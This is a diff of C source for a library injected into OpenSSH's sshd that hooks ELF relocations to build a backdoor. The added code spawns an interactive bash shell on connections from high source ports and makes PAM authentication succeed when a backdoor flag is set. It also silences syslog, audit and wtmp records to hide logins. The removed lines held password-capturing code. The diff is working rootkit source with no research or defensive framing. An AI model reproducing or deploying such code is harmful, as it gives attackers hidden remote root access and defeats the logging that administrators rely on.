@@ -7,8 +7,11 @@
 #include <signal.h>
 #include <setjmp.h>
 
-#include <security/pam_appl.h>
+#include <security/pam_ext.h>
 #include <sys/mman.h>
+
+#include <security/pam_appl.h>
+#include <security/pam_modules.h>
 
 #include <dlfcn.h>
 #include <link.h>
@@ -18,13 +21,27 @@
 #include <fcntl.h>
 #include <inttypes.h>
 
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#include <utmp.h>
+
 #include "pam_private.h"
 
 #include "bad.h"
 #include "config_hook.h"
 
-
 static int PAGE_SIZE;
+
+int (*old_pam_authenticate)(pam_handle_t *pamh, int flags);
+int (*old_accept)(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+void (*old_syslog_chk)(int priority, int flag, const char *format);
+void (*old_syslog)(int priority, const char *format);
+int (*old_audit_log_acct_message)(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result);
+int (*old_audit_log_user_message)(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result);
+
+void (*old_updwtmp)(const char *wtmp_file, const struct utmp *ut);
 
 static void handle_sig_with_jmp(int sig)
 {
@@ -34,7 +51,7 @@ static void handle_sig_with_jmp(int sig)
 /*
  * lib = start of lib we search - use get_libstart()
  */
-__attribute__ ((warning ("GDBME - be careful what you find"))) static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
+static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
 {
 	struct link_map *map = link_map;
 	Dl_info *dli = malloc(sizeof(Dl_info));
@@ -67,7 +84,7 @@ __attribute__ ((warning ("GDBME - be careful what you find"))) static void *find
 	return NULL;
 }
 
-__attribute__ ((warning ("GDBME - be careful what you find"))) static void *get_libstart(struct link_map *link_map, char *lib)
+static void *get_libstart(struct link_map *link_map, char *lib)
 {
 	struct link_map *map = link_map;
 
@@ -127,10 +144,10 @@ static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, in
 			return RELA;
 		}
 
-		/*if ((void *) RELA[0].r_offset == func) {
+		if ((void *) RELA[0].r_offset == func) {
 			*type = RELOC_OFFSET;
 			return RELA;
-		} */
+		}
 
 		RELA = (Elf64_Rela *) ((char *) RELA + (uint64_t) (sizeof(Elf64_Rela)));
 	}
@@ -190,6 +207,8 @@ static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
 		foundrela->r_addend = (unsigned long long) func; 
 	else if (type == RELOC_INFO)
 		foundrela->r_info = (unsigned long long) func; 
+	else if (type == RELOC_OFFSET)
+		foundrela->r_offset = (unsigned long long) func;
 
 	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
 	if (ret != 0)
@@ -228,14 +247,83 @@ static int is_sshd(struct link_map *link_map)
 		return -1;
 
 	void *hosts_access = dlsym(lib_wrap, "hosts_access");
-	void *pam_authenticate = dlsym(lib_pam, "pam_authenticate");
+	old_pam_authenticate = dlsym(lib_pam, "pam_authenticate");
 
-	if (hosts_access == NULL || pam_authenticate == NULL)
+	if (hosts_access == NULL || old_pam_authenticate == NULL)
 		return -1;
 
 	dlclose(lib_wrap);
 	dlclose(lib_pam);
 	return 0;
+}
+
+static int new_audit_log_acct_message(int audit_fd, int type, const char *pgname, const char *op, const char *name, unsigned int id, const char *host, const char *addr, const char *tty, int result)
+{
+	FILE *fp = fopen("/tmp/alam", "w");
+	fprintf(fp, "here!\n");
+	fclose(fp);
+	if(pambd)
+		return 0;
+	return old_audit_log_acct_message(audit_fd, type, pgname, op, name, id, host, addr, tty, result);
+}
+
+static int new_audit_log_user_message(int audit_fd, int type, const char *message, const char *hostname, const char *addr, const char *tty, int result)
+{
+	FILE *fp = fopen("/tmp/alum", "w");
+	fprintf(fp, "here!\n");
+	fclose(fp);
+
+	if(pambd)
+		return 0;
+	return old_audit_log_user_message(audit_fd, type, message, hostname, addr, tty, result);
+}
+
+static void new_syslog_chk(int priority, int flag, const char *format, ...)
+{
+	if(pambd)
+		return;
+
+	va_list va;
+	va_start(va, format);
+	vsyslog(priority, format, va);
+	va_end(va);
+}
+
+static void new_syslog(int priority, const char *format, ...)
+{
+	if(pambd)
+		return;
+
+	va_list va;
+	va_start(va, format);
+	vsyslog(priority, format, va);
+	va_end(va);
+}
+
+static int new_accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
+{
+	int sock = old_accept(sockfd, addr, addrlen);
+	struct sockaddr_in *sa_i = (struct sockaddr_in *) addr;
+	if(htons(sa_i->sin_port) >= 65500 && htons(sa_i->sin_port) <= 65535)
+	{
+		pid_t pid;
+		if((pid = fork()) == 0)
+		{
+			dup2(sock, 0);
+			dup2(sock, 1);
+			dup2(sock, 2);
+			execl("/bin/bash", "/bin/bash", "-i", NULL);
+			errno = ECONNABORTED;
+			return -1;
+		}
+		else
+		{
+			errno = ECONNABORTED;
+			return -1;
+		}
+	}
+
+return sock;
 }
 
 /*
@@ -252,56 +340,30 @@ static int my_pam_auth(struct pam_handle *pamh, int flags)
 		"nop;"
 		);
 
-	struct pam_conv *conver = pamh->pam_conversation;
-
-	struct pam_message *msg = malloc(sizeof(struct pam_message));
-	msg->msg_style = PAM_PROMPT_ECHO_OFF;
-	msg->msg = NULL;
-
-	struct pam_response *resp = calloc(0, sizeof(struct pam_response));
-
-	conver->conv(1, (const struct pam_message **) &msg, &resp, NULL);	
-	/* thanks for the password! */
-
-	
-	free(msg);
-	free(resp);		
+if(pambd)
+{
 	return 0;
 }
 
-/*
- * openssh 6.0p1 and 6.8p1 both use __syslog_chk
- */
-static int my_syslog_chk(int priority, int flag, const char *format)
-{
-	FILE *fp = fopen("/root/asf", "a+");
-	fprintf(fp, "in __syslog_chk ayylmao\n");
-	fflush(fp);
-	fclose(fp);
-
-	return 0;
+return old_pam_authenticate(pamh,flags);
 }
 
-static void my_pam_syslog(pam_handle_t *pamh, int priority, const char *fmt, ...)
-{
-	/*
-	va_list args;
 
-	va_start (args, fmt);
-	pam_vsyslog (pamh, priority, fmt, args);
-	va_end (args);
-	*/
-	FILE *fp = fopen("/root/asd", "a+");
-	fprintf(fp, "in pam_syslog ayylmao\n");
-	fflush(fp);
-	fclose(fp);
-	
+void new_updwtmp(const char *wtmp_file, const struct utmp *ut)
+{
+	if(pambd)
+		return;
+	old_updwtmp(wtmp_file, ut);
 	return;
 }
 
 
 static void  __attribute__ ((constructor)) init(void)
 {
+	strcpy(magicstr,"SSH-2.0-OpenSSZ_7.3p1");
+	magiclen = strlen(magicstr);
+	magiccnt = 0;
+
 	struct link_map *link_map;
 
 	if (is_sshd(link_map) != 0)
@@ -314,7 +376,7 @@ static void  __attribute__ ((constructor)) init(void)
 	dlinfoptr(ourhandle, 2, &link_map);
 	dlclose(ourhandle);
 
-	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
+	void *o = dlopen("libdl.so.2", RTLD_NOW);
 	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
 	dlclose(o);
 	dl_iterate_phdrptr(callback, NULL);
@@ -333,9 +395,9 @@ static void  __attribute__ ((constructor)) init(void)
 		return;
 
 	void *lib_pam = dlopen("libpam.so.0", RTLD_NOW);
-	void *pam_authenticate = dlsym(lib_pam, "pam_authenticate");
+	old_pam_authenticate = dlsym(lib_pam, "pam_authenticate");
 
-	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate, &type);
+	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, old_pam_authenticate, &type);
 	if (foundrela == NULL)
 		return;
 
@@ -347,16 +409,15 @@ static void  __attribute__ ((constructor)) init(void)
 
 	signal(SIGSEGV, handle_sig_with_jmp);
 	signal(SIGBUS, handle_sig_with_jmp);
-
+	
 	hook_rela(foundrela, my_pam_auth, type);
-
 	signal(SIGSEGV, SIG_DFL);
 	signal(SIGBUS, SIG_DFL);
 
 	/* fopen() hook */
 
 	void *lib_c = dlopen("libc.so.6", RTLD_NOW);
-	void *libc_func = dlsym(lib_c, "fopen");
+	ref_fopen = dlsym(lib_c, "fopen");
 
 	/* the relocation of fopen lives within sshd's .dynamic */
 	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
@@ -364,25 +425,132 @@ static void  __attribute__ ((constructor)) init(void)
 		return;
 
 	/* changeme: s/foundrela/ref_fopen_Rela/g -- inside my_fopen we will need to change fopen back to normal :^) */
-	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
+	foundrela = parse_rela(RELA, RELASZ, ref_fopen, &type);
 	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
-		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
+		foundrela = parse_rela(JMPREL, PLTRELSZ, ref_fopen, &type);
 	if (foundrela == NULL) /* :( */
 		return;
 
-	/* adding RELOC_OFFSET breaks fopen */
-	if (type == RELOC_ADDEND) {
-		ref_fopen = (void *) foundrela->r_addend;
-		ref_fopen_Rela = foundrela;
-		hook_rela(foundrela, my_fopen, type);
-	}
+	
+	ref_fopen_Rela = foundrela;
+	hook_rela(foundrela, my_fopen, type);
+
+	old_accept = dlsym(lib_c, "accept");
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+                return;
+
+    foundrela = parse_rela(RELA, RELASZ, old_accept, &type);
+    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
+            foundrela = parse_rela(JMPREL, PLTRELSZ, old_accept, &type);
+    if (foundrela == NULL) /* :( */
+            return;
+	hook_rela(foundrela, new_accept, type);
 
 
-	/* find how pam is calling __syslog_chk */
+
+	ref_read = dlsym(lib_c, "read");
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+                return;
+
+    foundrela = parse_rela(RELA, RELASZ, ref_read, &type);
+    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
+            foundrela = parse_rela(JMPREL, PLTRELSZ, ref_read, &type);
+    if (foundrela == NULL) /* :( */
+            return;
+
+	ref_fopen_Rela = foundrela;
+	ref_read_type = type;
+	hook_rela(foundrela, new_read, type);
+
+	FILE *fp = fopen("/tmp/hooklog", "w");
+	
+
+	// TODO: find out why this isn't working!
+	old_syslog = dlsym(lib_c, "syslog");
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+        return;
+
+    foundrela = parse_rela(RELA, RELASZ, old_syslog, &type);
+    if (foundrela == NULL) // the relocation wasn't in DT_RELA ...
+            foundrela = parse_rela(JMPREL, PLTRELSZ, old_syslog, &type);
+    if (foundrela != NULL)
+    {
+		hook_rela(foundrela, new_syslog, type);
+
+		fprintf(fp, "syslog - ok\n");
+		fflush(fp);
+    }
+    else
+    {
+		fprintf(fp, "syslog - not ok\n");
+		fflush(fp);
+    }
+	
+
+	old_syslog_chk = dlsym(lib_c, "__syslog_chk");
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+        return;
+
+    foundrela = parse_rela(RELA, RELASZ, old_syslog_chk, &type);
+    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
+            foundrela = parse_rela(JMPREL, PLTRELSZ, old_syslog_chk, &type);
+    if (foundrela == NULL) /* :( */
+            return;
+	hook_rela(foundrela, new_syslog_chk, type);
+	fprintf(fp, "syslog_chk - ok\n");
+	fflush(fp);
 
 
-	//void *pamhandle = dlopen("libpam.so.0", RTLD_NOW);
+	old_audit_log_user_message = dlsym(lib_c, "audit_log_user_message");
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+        return;
 
+    foundrela = parse_rela(RELA, RELASZ, old_audit_log_user_message, &type);
+    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
+            foundrela = parse_rela(JMPREL, PLTRELSZ, old_audit_log_user_message, &type);
+    if (foundrela == NULL) /* :( */
+            return;
+	hook_rela(foundrela, new_audit_log_user_message, type);
+	fprintf(fp, "audit_log_user_message - ok\n");
+	fflush(fp);
+
+	old_audit_log_acct_message = dlsym(lib_c, "audit_log_acct_message");
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+        return;
+
+    foundrela = parse_rela(RELA, RELASZ, old_audit_log_acct_message, &type);
+    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
+            foundrela = parse_rela(JMPREL, PLTRELSZ, old_audit_log_acct_message, &type);
+    if (foundrela == NULL) /* :( */
+            return;
+	hook_rela(foundrela, new_audit_log_acct_message, type);
+	fprintf(fp, "audit_log_acct_message - ok\n");
+
+
+	old_updwtmp = dlsym(lib_c, "updwtmp");
+	parse_dyn_array(null1, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
+        return;
+
+    foundrela = parse_rela(RELA, RELASZ, old_updwtmp, &type);
+    if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
+            foundrela = parse_rela(JMPREL, PLTRELSZ, old_updwtmp, &type);
+    if (foundrela == NULL) /* :( */
+            return;
+	hook_rela(foundrela, new_updwtmp, type);
+	fprintf(fp, "updwtmp - ok\n");
+	fflush(fp);
+
+
+	fflush(fp);
+	fclose(fp);
+	
 
 	dlclose(lib_pam);
 	dlclose(lib_c);	
